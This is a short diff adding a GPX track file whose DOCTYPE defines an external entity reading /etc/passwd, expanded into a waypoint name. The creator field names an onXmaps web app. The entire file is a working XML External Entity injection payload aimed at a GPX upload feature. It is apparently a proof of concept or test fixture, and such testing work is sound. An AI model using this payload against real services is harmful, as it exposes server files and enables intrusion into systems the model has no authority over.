@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE gpx [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<gpx xmlns="http://www.topografix.com/GPX/1/1" version="1.1" creator="onXmaps hunt web"><wpt lat="1" lon="1"><name>&xxe;</name></wpt></gpx>
